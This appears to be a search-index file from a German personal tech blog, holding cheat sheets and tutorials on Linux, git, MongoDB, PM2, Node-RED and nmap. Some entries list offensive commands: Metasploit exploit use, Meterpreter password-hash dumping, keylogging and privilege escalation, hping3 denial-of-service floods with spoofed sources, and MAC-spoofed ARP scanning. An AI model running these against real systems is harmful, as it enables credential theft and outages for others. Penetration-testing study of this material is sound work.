var store = [{
        "title": "Linux Dateien/Verzeichnisse",
        "excerpt":"            Befehl      Beschreibung                  ls      Verzeichnisinhalt anzeigen              ls -al      Formatierte Ausgabe inkl. versteckter Dateien              ls -lh      Formatierte Ausgabe inkl. versteckter Dateien              cd dir      Verzeichniswechsel nach dir              cd      Wechsel ins home-Verzeichnis              pwd      Anzeigen des aktuellen Verzeichnisnamens              mkdir dir      Verzeichnis dir erzeugen              rm Datei      Löschen von Datei              rm -i Datei      Löschen einer Datei mit Sicherheitsabfrage              rm -r dir      Löschen des Verzeichnisses dir              rm -f Datei      erzwinge das Löschen von Datei              rm -rf dir      erzwinge das Löschen des Verzeichnisses dir *              cp Datei1 Datei2      Kopieren von Datei1 nach Datei2              cp -r dir1 dir2      Kopiere dir1 nach dir2; erzeugen von dir2 falls dieses nicht existiert              cp Datei1 Datei2      Kopieren von Datei1 nach Datei2              mv datei_a.txt datei_b.txt      Dateien unmbennen              file xxx.pdf      Informationen über die Datei ausgeben              head /var/log/syslog      Anzeigen der ersten 10 Zeilen des Files              head -20 /var/log/syslog      Anzeigen der ersten 20 Zeilen im File              tail /var/log/syslog      Anzeigen der letzen 10 Zeilen des Files              tail -20 /var/log/syslog      Anzeigen der letzen 20 Zeilen im File      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_01/",
        "teaser":null},{
        "title": "Linux Netzwerk",
        "excerpt":"            Befehl      Beschreibung                  ip addr      Ip Adresse anzeigen              ifconfig      Anzeige und Konfig von Netzwergeräten              traceroute to www.google.at      Transportweg anzeigen              netstat -lp      Zeigt an welches Programm auf welchen port hört      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_02/",
        "teaser":null},{
        "title": "Linux Paketverwaltung",
        "excerpt":"Debian, Ubuntu usw. (deb)            Befehl      Beschreibung                  sudo apt-get install PAKETNAME      Installiert das angegebene Programm aus den Paketquellen              sudo apt-get update      Lest die Paketquelle neu ein              sudo add-apt-repository ppa:Benutzer/PPA-Name      Externe Paketquelle hinzufügen              sudo update-rc.d xxx(zb:VNC)      Programm beim Systemstart starten (Daemon)              /etc/apt/sources.list.d      File mit den Links zu den Paketquellen      RHEL, CentOS (rpm,yum)            Befehl      Beschreibung                  yum install PAKETNAME      Paket mit yum installieren              yum update PAKETNAME      Paket updaten              yum remove PAKETNAME      Paket mit allen Abhängikeiten entfernen              yum search SUCHBEGRIFF      Es werden alle Paketquellen durchsucht      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_03/",
        "teaser":null},{
        "title": "Linux Dienste",
        "excerpt":"Prüfen welches Init System verwendet wird:$ cat /proc/1/commsystemdUpstart/SysVinit            Befehl      Beschreibung                  sudo service DIENSTNAME start      Dienst starten              sudo service DIENSTNAME stop      Dienst stoppen              sudo service DIENSTNAME restart      Status des Dienst anzeigen              sudo service DIENSTNAME status      Status des Dienst anzeigen      Systemd            Befehl      Beschreibung                  systemctl list-units      Listet alles geladenen Units auf              systemctl list-timers      Listet alle geladenen Timer auf              systemctl list-sockets      Listet alle geladenen Timer auf              systemctl start UNITNAME      Startet die Unit(Dienst)              systemctl stop UNITNAME      Stoppt die Unit(Dienst)              systemctl restart UNITNAME      Startet die Unit(Dienst) neu              systemctl reload UNITNAME      Startet die Unit(Dienst) neu und liest vorhande Konfigurationsdateien neu ein              systemctl status UNITNAME      Zeigt den aktuellen Status der Unit(Dienst) an              systemctl enable UNITNAME      Aktiviert die Unit damit diese mit dem System automatisch gestartet wird              systemctl disable UNITNAME      Deaktiviert die Unit damit diese nicht mehr automatisch mit dem System gestartet wird      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_04/",
        "teaser":null},{
        "title": "Linux Systeminformationen",
        "excerpt":"            Befehl      Beschreibung                  uptime      Anzeigen der aktuellen uptime              w      Anzeigen, wer angemeldet ist              whoami      als wer man eingeloggt ist              uname -a      Anzeigen von Kernel-Informationen              cat /proc/cpuinfo      CPU-Informationen anzeigen              cat /proc/meminfo      Speicher-Informationen anzeigen              man befehl      Anzeigen des Handbuchs für befehl              df      Anzeigen der Plattennutzung              du      Anzeigen der Speichernutzung des Verzeichnisses              free      Anzeigen der Nutzung von Speicher und swap              whereis app      Anzeigen möglicher Speicherorte von app      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_05/",
        "teaser":null},{
        "title": "Bash Skripte",
        "excerpt":"https://github.com/dg60/Bash_ScriptsSkript Variablen            Variable      Beschreibung                  $0      Der Name des Skripts              $1-$9      Die ersten 9 Argumente die den Skript übergeben werden              $#      Anzahl der Argumente die den Skript übergeben worden sind              $@      Alle Argumente die den Basch Script übergeben worden sind              $?      Der Exit-Status des zuletzt ausgeführten Prozesses.              $$      Die Prozess ID des aktuellen Prozess in dem das Skript läuft              $USER      Der Name des Users der das Skript ausführt              $SECONDS      Gibt aus wieviele Sekunden das Skript bereits läuft      Programm Test Ausdrücke            Operator      Description                  ! EXPRESSION      The EXPRESSION is false.              -n STRING      The length of STRING is greater than zero.              -z STRING      The lengh of STRING is zero (ie it is empty).              STRING1 = STRING2      STRING1 is equal to STRING2              STRING1 != STRING2      STRING1 is not equal to STRING2              INTEGER1 -eq INTEGER2      INTEGER1 is numerically equal to INTEGER2              INTEGER1 -gt INTEGER2      INTEGER1 is numerically greater than INTEGER2              INTEGER1 -lt INTEGER2      INTEGER1 is numerically less than INTEGER2              -d FILE      FILE exists and is a directory.              -e FILE      FILE exists.              -r FILE      FILE exists and the read permission is granted.              -s FILE      FILE exists and it’s size is greater than zero (ie. it is not empty).              -w FILE      FILE exists and the write permission is granted.              -x FILE      FILE exists and the execute permission is granted.              man test      man pages for the command test      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/linux_06/",
        "teaser":null},{
        "title": "GIT Allgemeine Befehle",
        "excerpt":"Git Dokumentation            Befehl      Beschreibung                  git status      Repo status anzeigen              git log      Logfile des repos anzeigen              git init      repo initialisieren              git add      Files dem repo hinzufügen              git add *.c      Alle dateien mit folgender dateiendung hinzufügen              git commit      Änderungen versionieren  (staging area)              git commit -a      Alle änderungen commiten              git clone      Repo klonen              git checkout      Version auschecken              git push      Repo auf github oder server laden      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/git_10/",
        "teaser":null},{
        "title": "GIT Tag erstellen",
        "excerpt":"            Befehl      Beschreibung                  git tag      Tags anzeigen              git tag -a v0.1 -m &#8216;My Version 0.1&#8217;      Tag anlegen              git tag v0.1-lw      Einfachen Tag anlegen              git push origin v0.1      Tag in remote repo laden      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/git_11/",
        "teaser":null},{
        "title": "GIT Branch erstellen",
        "excerpt":"            Befehl      Beschreibung                  git branch test      Erzeugt einen neuen branch mit dem namen test              git checkout test      Zum test branch wechseln  bzw. master              git checkout -b err001      Erzeugt einen neuen branch namens err001 und wechselt zum branch              git merge hotfix      Branch zusammenführen              git branch -d hotfix      Entfernt den erstellten branch              git branch -v      Letzten commit aller branches anzeigen      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/git_12/",
        "teaser":null},{
        "title": "MongoDB Allgemeine Befehle",
        "excerpt":"Getting started shellDocumentationAllgemeine Befehle            Befehl      Beschreibung                  mongo;      Mongo Shell öffnen              show dbs;      Alle Datenbanken auf den Server anzeigen              use test;      In die Datenbank wechseln              show collections;      Alle Collections der Datenbank anzeigen      Datenbank operationen            Befehl      Beschreibung                  db.auth()      User anmelden (Falls vorhanden)              db.collection.find()      Alle Dokumente in der Datenbank anzeigen              db.collection.insert()      Neues Dokument in die Collection einfügen              db.Collection.find({ created_at : {‘$gte’: new Timestamp(new Date(2012, 0, 21), 0), ‘$lte’: new Timestamp(new Date(2012, 0, 22), 0) })      Zeitbereich abfragen      Backup            Befehl      Beschreibung                  mongoexport –db test –collection Records –out records.json      Collection exportieren              mongodump      Datenbank backup erzeugen      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/mongodb_20/",
        "teaser":null},{
        "title": "PM2 CLI Commands",
        "excerpt":"DocumentationAllgemeine Befehle            Befehl      Beschreibung                  pm2 start app.js      Prozess mit PM2 starten z.B: app.js              pm2 start app.js –name “app”      app.js unter den Namen z.B: app starten              pm2 list      Liste aller pm2 Prozesse anzeigen              pm2 jlist      Liste aller pm2 Prozesse im JSON Format anzeigen              pm2 monit      Monitor für alle Prozesse starten      Aktionen            Befehl      Beschreibung                  pm2 stop all      Stoppt alle pm2 prozesse              pm2 restart all      Startet alle pm2 prozesse neu              pm2 reload all      Lädt alle Prozesse neu              pm2 stop 0      Stoppt dem prozess mit der id 0              pm2 restart 0      Startet den Prozess mit der ID 0 neu              pm2 delete 0      Löscht den Prozess mit der id 0 aus der Prozessliste              pm2 delete all      Löscht alle Prozesse aus der Prozessliste      Logs            Befehl      Beschreibung                  pm2 logs      Anzeige der Logmeldungen von allen Prozessen              pm2 logs app      Anzeige der Logmeldungen vom Prozess z.B:app              pm2 logs app –lines 1000      Zeigt die letzen 100 Einträge im Log an              pm2 flush      Löscht alle Logeinträgen von allen Prozessen      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/pm2_30/",
        "teaser":null},{
        "title": "NMAP Scan",
        "excerpt":"Documentation            Befehl      Beschreibung                  nmap -sT -Pn 192.168.1.100      TCP Verbindungsscan              nmap -sT -p 21 -Pn 192.168.1.100      TCP Verbindungsscan Port 21              nmap -sT -Pn 192.168.1.1-254      TCP Verbindungsscan über das gesamte Subnet              nmap -sT -p 21 -Pn 192.168.1.1-254      TCP Verbindungsscan über das gesamte Subnet auf Port 21              nmap -sS -p 21 -Pn 192.168.x.xxx      SYN-Scan              nmap -sU 192.168.1.1      UDP Scan              nmap -sUV 192.168.1.1      UDP Version-Scan              nmap -sX -p- -Pn 192.168.1.1      Christmas tree scan              nmap -sN -p- -Pn 192.168.1.1      NULL Scan      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/nmap_40/",
        "teaser":null},{
        "title": "NMAP NSE Script Scan",
        "excerpt":"NSE Script Scan            Befehl      Beschreibung                  nmap -script banner 192.168.1.1      Scan mit Banner Ausgabe              nmap -script vuln 192.168.1.1      Scan auf Sicherheitslücken              nmap -script version 192.168.1.1      Scan auf Versionen der Services      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/nmap_41/",
        "teaser":null},{
        "title": "NMAP Standard Ports/Dienste",
        "excerpt":"            Portnummer      Service                  20      FTP-Datenübertragung              22      FTP-Steuerung              22      SSH              23      Telnet              25      SMTP (Email)              53      DNS              80      HTTP              137-139      NetBIOS              443      HTTPS              445      SMB              1433      MSSQL              3306      MySQL              3389      RDP              5800      VNC über HTTP              5900      VNC      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/nmap_42/",
        "teaser":null},{
        "title": "Metasploit Allgemeine Befehle",
        "excerpt":"            Befehl      Beschreibung                  msfconsole      metasploit framework starten              msfupdate      metasploit framework updaten              search       nach Exploit suchen              use exploit/windows/smb/ms08_067_netapi      exploit benutzen              show payloads      Payloads anzeigen              set payload      Payload setzen              show OPTIONS      Optionen des Payloads setzen              set parameter      Parameter des Payloads setzen              set parameter      Parameter des Payloads setzen              exploit      Exploit ausführen              search platform:”Windows XP SP3” type:exploit      Exploit für bestimmte OS Version suchen      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/metasploit_50/",
        "teaser":null},{
        "title": "Meterpreter Befehle",
        "excerpt":"            Befehl      Beschreibung                  help      Zeigt alle verfügbaren Befehle an              hashdump      Liest die user und deren Passworthashes aus der SAM Datenbank              ps      Liesst die aktuell laufenden Prozesse vom Zielsystem aus              screenshot      Erstellen eines Screenshots vom Bildschirm des Zielsystems              keyscan_start      Startet die Aufzeichnung der Tastatureingabe              keyscan_stop      Stoppt die Aufzeichnung der Tastatureingabe              keyscan_dump      Zeigt die derzeit erfassten Tastatureingaben vom Zielcomputer              migrate PID      Verschiebt die Meterpreter-Shell zu einem anderen laufenden Prozess.              getsystem      Weist Meterpreter an, die Rechte auf den höchstmöglichen Stand auszuweiten (Privilege  Escalation)              getuid      Zeigt das aktuelle User Level an unter dem die Meterpreter Shell läuft      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/metasploit_51/",
        "teaser":null},{
        "title": "DOS/DDOS",
        "excerpt":"hping 3            Befehl      Beschreibung                  hping3 -c 100 –flood -S 192.168.1.xxx      Dos Angriff mit hping              hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 –flood –rand-source 192.168.1.xxx      Dos Angriff auf Port 445 von port 445                  Option      Beschreibung                  -v      Version anzeigen              –flood      Sendet so viele Pakete wie möglich              -V      Verbose mode aktivieren (Mehr Details)              -c      Paketanzahl              -p      Zielport              -s      Quellport              -d      Grösse der Daten      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/kali_60/",
        "teaser":null},{
        "title": "Information gathering",
        "excerpt":"arp-scan            Befehl      Beschreibung                  arp-scan -l      Scannt das komplette lokale netzwerk              arp-scan -I eth0 &#8211;srcaddr=DE:AD:BE:EF:CA:FE 192.168.86.0/24      Scannt das komplette lokale netzwerk mit einer angepassten MAC-Adresse      ","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/docs/kali_61/",
        "teaser":null},{
        "title": "Homepage Ist Online",
        "excerpt":"Homepage ist online www.dgrill.at.Mehr informationen findet ihr hier Work Section !","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/Homepage-ist-Online/",
        "teaser":"https://dg60.github.io/images/HomeDanielG.jpg"},{
        "title": "Node Red Einführung",
        "excerpt":"console.log('It´s time to code');Heute möchte ich euch eine kurze Einführung in Node-RED geben. Node-RED ist ein Visuelles Tool um einfache und anspruchsvolle Anwendungen für das “Internet der Dinge” kurz. IOT zu schaffen.Node-RED baut auf die leichtgewichtige Node.js Laufzeitumgebung auf die als Grundlage zum ausführen des erzeugten Javascript code von Node-RED dient. Dadurch ist die Ausführung auf verschiedensten Hardwareplattformen möglich.Kompatible Node-RED Hardware:  Rasperry Pi  BeagleBone Black  uvm…Meine Aufmerksamkeit hat Node-RED geweckt weil es unglaublich schnell und einfach einsatzbereit ist und eine breite Palette an Funktionen abdeckt die im Bereich IOT gefordert sind. In der NPM Bibliothek sind bereits über 120,000 Module zu finden um die Funktionen von Node-RED zu erweitern. nodered.org Node-RED Quellcode auf Github Node-RED QuellcodeInstallation Node.jsBevor wir mit der Installation von Node-Red starten können müssen wir noch Node js installieren. Hierzu braucht ihr nur dem unten aufgeführten Link für euer Betriebssystem folgen.Ist Node.js bereits auf euren Computer installiert könnt ihr diesen Punkt überspringen und mit der Installation von Node-Red Fortfahren.Node.js Installation UbuntuNode.js Installation WindowsNode.js Installation OSXUm zu überprüfen das Node.js ordnungsgemäß installiert ist reicht folgende Befehl.$ node -vv4.4.7Es sollte nun die aktuelle installierte Version von Node.js ausgegeben werden.Installation Node-REDUm Node-Red zu installieren reicht es die unten angeführten Befehle in das Terminal einzugeben.$ sudo npm install -g node-red$ node-redWurde die Installation von Node-RED Erfolgreich Abgeschlossen sollte folgende Ausgabe im Terminal erscheinen.Welcome to Node-RED===================20 Oct 17:50:51 - [info] Node-RED version: v0.14.520 Oct 17:50:51 - [info] Node.js  version: v4.4.720 Oct 17:50:51 - [info] Linux 4.4.0-43-generic x64 LE20 Oct 17:50:51 - [info] Loading palette nodes20 Oct 17:50:53 - [warn] ------------------------------------------------------20 Oct 17:50:53 - [info] Settings file  : /home/dgrill/.node-red/settings.js20 Oct 17:50:53 - [info] User directory : /home/dgrill/.node-red20 Oct 17:50:53 - [info] Flows file     : /home/dgrill/.node-red/flows_ServerGrill.json20 Oct 17:50:53 - [info] Server now running at http://127.0.0.1:1880/20 Oct 17:50:53 - [info] Starting flows20 Oct 17:50:53 - [info] Started flowsErsten Flow ErstellenErreichbar ist Node-RED nun unter http://127.0.0.1:1880/Nun sollte folgende Seite im Browserfenster aufgerufen werden.    Auf der linken Seite sehen wir ein Menü wo alle Steuerelemente nach Gruppen (input, output, function usw.) sortiert diese können einfach per Drag und drop auf demFlow Board platziert werden. In der Mitte befindet sich das Flow Board wo alle Steuerelemente frei platziert werden können.Auf der rechten Seite gibt es einmal das Info Fenster und das wohl wichtigste Fenster Debug. Gleich darüber befindet sich der Deploy Button derjetzt noch grau hinterlegt ist. Und genau das wollen wir jetzt ändern :)Zum Einstieg wollen wir “Hello Node-RED” im Debug Fenster ausgeben. Hierzu ziehen wir uns das inject Steuerelemente von der rechten Seite auf das Flow Board.    Durch einen Doppelklick auf das Steuerelemente öffnet sich der Eigenschaften Dialog. Hier wählen wir bei Payload die Eigenschaft string, und geben“Hello Node-RED” ein. Anschließend speichern wir die eingabe durch das Drücken des Button Done.        Jetzt ziehen wir uns das Steuerelemente Debug auf das Flow Board, und verbinden einfach beide Elemente mit der Maus.    Jetzt brauchen wir nur noch den Button Deploy drücken und die Anwendung wird generiert. Um jetzt die Meldung in das Debug Fenster zu schreiben genügtein Klick auf den Inject Button und es sollte nun Hello Node-RED in der Debug Konsole ausgegeben werden.    Import eines FlowsEin Flow kann ganz einfach über die Optionen in der rechten oberen ecke importiert werden. Im sich nun öffnenden Dropdown Menü wähl man dieOption Import &gt; Clipboard.    In den nun geöffneten Dialog kopieren wir folgendes:[{\"id\":\"58c77306.a9bc6c\",\"type\":\"inject\",\"z\":\"f2cee3fc.2d2df8\",\"name\":\"\",\"topic\":\"\",\"payload\":\"Hello Node-RED\",\"payloadType\":\"str\",\"repeat\":\"\",\"crontab\":\"\",\"once\":false,\"x\":156,\"y\":128,\"wires\":[[\"8b5d31de.8a8bb\"]]},{\"id\":\"8b5d31de.8a8bb\",\"type\":\"debug\",\"z\":\"f2cee3fc.2d2df8\",\"name\":\"\",\"active\":true,\"console\":\"false\",\"complete\":\"false\",\"x\":407,\"y\":128,\"wires\":[]}]        Die nun importierten Elemente können nun frei am Flow Board platziert werden.console.log('See you !');Mehr InformationenHier findet ihr eine Menge Beispiele die ihr ganz einfach über die Importfunktion importiert könnt.Node-RED LibraryEin sehr guter Guide zum Einstieg in Node-REDNode-RED GuideNPM Package zum erstellen eines schnellen User interfaces (UI)Node-RED UI NPM Package","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/Node-Red-Einf%C3%BChrung/",
        "teaser":"https://dg60.github.io/images/docs/node-red-icon.png"},{
        "title": "Pm2 Prozess Manager Einführung",
        "excerpt":"console.log('It´s time to code');Hallo,Heute möchte ich euch kurz den Prozessmanager PM2 vorstellen. Der mittels CLI Interface sehr komfortabel gesteuert werden kann.Primäre Aufgaben eines Prozessmanagers:  Automatischer Neustart der Anwendung nach einem Absturz  Protokollierung im Fehlerfall  Monitorring des Laufzeitverhaltens und der Ressourcennutzung  Nachladen von Programmen ohne Ausfallzeit  uvm.PM2 ist primär für den Einsatz in einer Produktivumgebung gedacht um bei einen Absturz einer Anwendung diese neu zu starten und den Fehler in einem Logfilefestzuhalten. Gerade in der Releasephase einer Anwendung ist es von großen Vorteil das nicht jedes mal die Anwendung von Hand neu gestartet werden muss wenn ein Fehler auftritt.PM2 unterstützt eine breite Palette von folgenden Skriptsprachen:  Javascript (Node.js)  Python  Ruby  uvm.InstallationPM2 lässt sich ganz einfach über den Node Packet Manager (npm) mit folgenden Befehl installieren:$ sudo npm install -g pm2Nach der Installation prüfen wir noch ob PM2 auch ordnungsgemäß installiert worden ist mit folgenden Befehl:$ pm2 Und wir sollten folgende Ausgabe erhalten: Basic Examples:    Start an app using all CPUs available + set a name :    $ pm2 start app.js -i 0 --name \"api\"    Restart the previous app launched, by name :    $ pm2 restart api    Stop the app :    $ pm2 stop api    Restart the app that is stopped :    $ pm2 restart api    Remove the app from the process list :    $ pm2 delete api    Kill daemon pm2 :    $ pm2 kill    Update pm2 :    $ npm install pm2@latest -g ; pm2 update    More examples in https://github.com/Unitech/pm2#usagefeatures  Deployment help:    $ pm2 deploy helpErste Schritte mit PM2Um einen Prozess über PM2 zu starten brauchen wir erst einmal ein kleines Skript. Dafür kopieren wir den unten angeführten Quellcode in einen Datei und geben ihr den Namen app.js.var http = require('http');var server = http.createServer(function (request, response) {  response.writeHead(200, {\"Content-Type\": \"text/plain\"});  response.end(\"Hello PM2\\n\");  console.log(response.statusCode + ' ' + response.statusMessage);}); // Listen on port 8000, IP defaults to 127.0.0.1server.listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\");//app.jsAnschließend starten wie das Skript mit PM2 mit folgenden Befehl:$ pm2 start app.js --name \"app\"[PM2] Spawning PM2 daemon with pm2_home=/home/dgrill/.pm2[PM2] PM2 Successfully daemonized[PM2] Starting /home/dgrill/Schreibtisch/TEMP/app.js in fork_mode (1 instance)[PM2] Done.┌──────────┬────┬──────┬───────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐│ App name │ id │ mode │ pid   │ status │ restart │ uptime │ cpu │ mem       │ watching │├──────────┼────┼──────┼───────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤│ app      │ 0  │ fork │ 20211 │ online │ 0       │ 0s     │ 2%  │ 20.0 MB   │ disabled │└──────────┴────┴──────┴───────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘ Use `pm2 show &lt;id|name&gt;` to get more details about an appUnd sehen in der Ausgabe das der Prozess nun erfolgreich gestartet worden ist. Sollte unser kleine Anwendung nun einen Fehler produzieren wird der Prozess automatisch von PM2 neu gestartet und der restart counter erhöht. Des weiteren wird ein Eintrag im Error Log angelegt das Standardmässig unter linux im folgenden Verzeichnis zu finden ist (/home/user/.pm2/logs). Zusätzlich zum überwachenund neustarten von Prozessen zeichnet PM2 auch alle Logmeldungen auf, die von der Applikation in die Standard Ausgabe geschrieben werden./home/user/.pm2├── logs│   ├── app-error-0.log│   └── app-out-0.log├── module_conf.json├── pids│   └── app-0.pid├── pm2.log├── pm2.pid├── pub.sock├── rpc.sock└── touch2 directories, 9 filesLog Einträge anzeigenUm sich die aktuellen Logmeldungen des laufenden Prozess live anzusehen geben wir folgenden Befehl ein:$ pm2 logs appUnd wir erhalten folgende Ausgabe:[STREAMING] Now streaming realtime logs for [app] processRufen wir nun in unseren Browser folgenden Link auf http://localhost:8000/ und senden somit eine Anfrage an unsere Applikation. Werden die Logmeldungen in Echtzeit ausgegeben.0|app      | 200 OK 0|app      | 200 OK Starten von Prozesse via config.jsonSollen mehrere Anwendungen von PM2 überwacht werden bittet es sich an alle Prozesse in eine json Datei zusammen zu fassen. Somit können mehrere Prozesse mit einen Befehl von PM2 überwacht werden.[{  \"script\"    : \"/home/dgrill/Schreibtisch/TEMP/app/app.js\",  \"name\"      : \"app\",  \"merge_logs\"      : true,  \"log_date_format\" : \"YYYY-MM-DD HH:mm Z\"},{  \"script\"    : \"/home/dgrill/Schreibtisch/TEMP/app_1/app_1.js\",  \"name\"      : \"app_1\",  \"merge_logs\"      : true,  \"log_date_format\" : \"YYYY-MM-DD HH:mm Z\"}]process.jsonDas Starten der Anwendung folgt wie schon oben beschrieben über den Befehl pm2 start nur mit dem Unterschied das wir hier die config.json datei angeben.$ pm2 start process.json [PM2][WARN] Applications app, app_1 not running, starting...[PM2] App [app] launched (1 instances)[PM2] App [app_1] launched (1 instances)┌──────────┬────┬──────┬──────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐│ App name │ id │ mode │ pid  │ status │ restart │ uptime │ cpu │ mem       │ watching │├──────────┼────┼──────┼──────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤│ app      │ 0  │ fork │ 2019 │ online │ 0       │ 0s     │ 0%  │ 17.2 MB   │ disabled ││ app_1    │ 1  │ fork │ 2024 │ online │ 0       │ 0s     │ 0%  │ 16.6 MB   │ disabled │└──────────┴────┴──────┴──────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘ Use `pm2 show &lt;id|name&gt;` to get more details about an appNeustarten der Prozesse$ pm2 restart process.json [PM2] Applying action restartProcessId on app [app](ids: 0)[PM2] Applying action restartProcessId on app [app_1](ids: 1)[PM2] [app](0) ✓[PM2] [app_1](1) ✓┌──────────┬────┬──────┬──────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐│ App name │ id │ mode │ pid  │ status │ restart │ uptime │ cpu │ mem       │ watching │├──────────┼────┼──────┼──────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤│ app      │ 0  │ fork │ 7131 │ online │ 0       │ 10s    │ 0%  │ 17.3 MB   │ disabled ││ app_1    │ 1  │ fork │ 7136 │ online │ 0       │ 10s    │ 0%  │ 15.2 MB   │ disabled │└──────────┴────┴──────┴──────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘ Use `pm2 show &lt;id|name&gt;` to get more details about an appStoppen der Prozesse$ pm2 stop process.json [PM2] [app](0) ✓[PM2] [app_1](1) ✓┌──────────┬────┬──────┬─────┬─────────┬─────────┬────────┬─────┬────────┬──────────┐│ App name │ id │ mode │ pid │ status  │ restart │ uptime │ cpu │ mem    │ watching │├──────────┼────┼──────┼─────┼─────────┼─────────┼────────┼─────┼────────┼──────────┤│ app      │ 0  │ fork │ 0   │ stopped │ 0       │ 12     │ 0%  │ 0 B    │ disabled ││ app_1    │ 1  │ fork │ 0   │ stopped │ 0       │ 12     │ 0%  │ 0 B    │ disabled │└──────────┴────┴──────┴─────┴─────────┴─────────┴────────┴─────┴────────┴──────────┘ Use `pm2 show &lt;id|name&gt;` to get more details about an appDer weitere große Vorteil von eine config.json datei ist das alle in diese enthalten Datei auf einmal gestartet/gestoppt oder neu gestartetwerden können. Und somit auch Abhängigkeiten von Prozessen berücksichtigt werden können.PM2 im produktiven EinsatzUm nun PM2 produktiv einzusetzen müssen noch ein paar Grundeinstellungen vorgenommen werden. Als erstes müssen wie PM2 als dameon(bzw. Dienst) einrichten. Hierzu reicht uns erstmals folgender Befehl:$ pm2 startup[PM2] You have to run this command as root. Execute the following command:      sudo su -c \"env PATH=$PATH:/home/unitech/.nvm/versions/node/v4.3/bin pm2 startup &lt;distribution&gt; -u &lt;user&gt; --hp &lt;home-path&gt;PM2 erstellt durch diesen Befehl automatisch ein Startscript für unser System und mit dem Befehl aus der Ausgabe wird das Startscript für den Systemstart registriert.[PM2] Spawning PM2 daemon with pm2_home=/root/.pm2[PM2] PM2 Successfully daemonized[PM2] Writing startup script in /etc/init.d/pm2-init.sh[PM2] Making script booting at startup...[PM2] -linux- Using the command:      su -c \"chmod +x /etc/init.d/pm2-init.sh &amp;&amp; update-rc.d pm2-init.sh defaults\"[PM2] Done.[PM2] Now you can type$ pm2 save[PM2] To save the current process list at reboot or via pm2 updateWurde das Startskript erfolgreich im System registriert erhalten wir noch den Hinweise den Befehl pm2 save auszuführen.$ pm2 saveUnd das sollte wir auch auf alle Fälle tun wenn wir alle aktuellen prozesse speichern wollen und somit sicherstellen das nach einen Systemneustart alle Prozesse gestartet werden. Sollten wir das Speichern der Prozesse vergessen wird nach einen Systemneustart von PM2 kein Prozess gestartet. PM2 save muss auch jedes mal ausgeführt werden wenn wir einen neuen Prozess hinzufügen.console.log('See you !');Mehr InformationenEine Sammlung der Wichtigsten PM2 BefehlePM2 KommandoreferenzDie offiziele Dokumentation von PM2PM2 Official Docs","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/PM2-Prozess-Manager-Einf%C3%BChrung/",
        "teaser":"https://dg60.github.io/images/docs/pm2_small.png"},{
        "title": "Nmap",
        "excerpt":"console.log('It´s time to hack');Hallo,Heute möchte ich euch kurz den Netzwerk/Portscanner Nmap vorstellen. Der mittels CLI Interface oder GUI Zenmap sehr komfortabel gesteuert werden kann. Nmap dient Primär zur Aufklärung und Erkennung von Schwachstellen in einem Netzwerk.Grundlagen PortscanningPrimäre Aufgaben von Nmap:  Durchführen von Netzwerksscans  Prüfen welche Ports am Zielsystem geöffnet sind  Erkennug der Dienste die hinter den offenen Ports laufen  Schwachstellenerkennung mittels NSE skripten  uvm.InstallationDer einfachste weg ist es die Kali Linux Distribution von Kali.org herunter zu laden. Die Distribution gibt es als live Image oder als Abild einer Virtuelle Maschine für die Hypervisoren Vmware Player/Virtual Box auf der Seite von Offense Security.Es ist jedoch auch ohne weiteres möglich Nmap wie jedes andere Programm zu installieren. Nmap stellt die Binaries für alle gängigen Betriebssysteme(Linux, MacOS, Windows) zur verfügung.Bitte führen sie keine Netzwerk oder Portscan in fremden Netzwerken oder in deren sie nicht berechtigt sind.Grundlegende Port-Scanning Methoden      -sS TCP-SYN-ScanDer SYN-Scan ist aus gutem Grund die Standardeinstellung und die beliebteste Scan-Methode. Er kann schnell durchgeführt werden und scannt dabei Tausende von Ports pro Sekunde, wenn das Netzwerk schnell ist und nicht von einer intrusiven Firewall behindert wird. Der SYN-Scan ist relativ unauffällig, da er TCP-Verbindungen niemals abschließt. Außerdem funktioniert er auch bei allen konformen TCP-Stacks und ist unabhängig von spezifischen Eigenarten von Plattformen, wie es bei den FIN-/NULL-/Xmas-, Maimon- und Idle-Scans in Nmap der Fall ist. Er erlaubt auch eine klare, zuverlässige Unterscheidung zwischen den Zuständen offen, geschlossen und gefiltert. Diese Methode wird oft als halboffenes Scannen bezeichnet, weil keine vollständige TCP-Verbindung hergestellt wird. Sie senden ein SYN-Paket, als ob Sie eine echte Verbindung herstellen würden, und warten dann auf eine Antwort. Ein SYN/ACK zeigt, dass jemand auf dem Port lauscht (dass er offen ist), während ein RST (Reset) anzeigt, dass niemand darauf lauscht. Falls nach mehreren erneuten Übertragungen keine Antwort erhalten wird, wird der Port als gefiltert markiert. Der Port wird auch dann als gefiltert markiert, wenn ein ICMP Unreachable-Fehler (Typ 3, Code 1, 2, 3, 9, 10 oder 13) empfangen wird.        -sT  TCP-Connect-Scan Der TCP-Connect-Scan ist der standardmäßig eingestellte 